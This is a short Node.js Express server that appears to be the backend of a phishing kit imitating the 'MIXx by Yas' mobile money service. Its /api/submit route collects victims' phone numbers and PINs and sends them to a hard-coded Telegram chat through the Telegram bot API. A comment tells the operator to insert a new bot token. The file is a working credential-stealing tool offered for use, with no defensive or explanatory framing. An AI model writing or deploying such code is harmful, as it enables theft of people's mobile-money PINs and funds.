const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// 🔴 REPLACE WITH YOUR NEW BOT TOKEN (CREATE NEW BOT VIA @BotFather)
const BOT_TOKEN = 'YOUR_NEW_BOT_TOKEN_HERE';  // <--- PUT NEW TOKEN HERE
const CHAT_ID = '8999616005';

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

app.post('/api/submit', async (req, res) => {
    const { phoneNumber, pin } = req.body;
    
    if (!phoneNumber || !pin) {
        return res.status(400).json({ error: 'Phone and PIN required' });
    }
    
    const message = `🔔 NEW SUBMISSION - MIXx BY YAS 🔔\n\n📱 Phone: ${phoneNumber}\n🔐 PIN: ${pin}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });
        
        console.log('✅ Sent:', phoneNumber);
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ error: 'Failed to send' });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
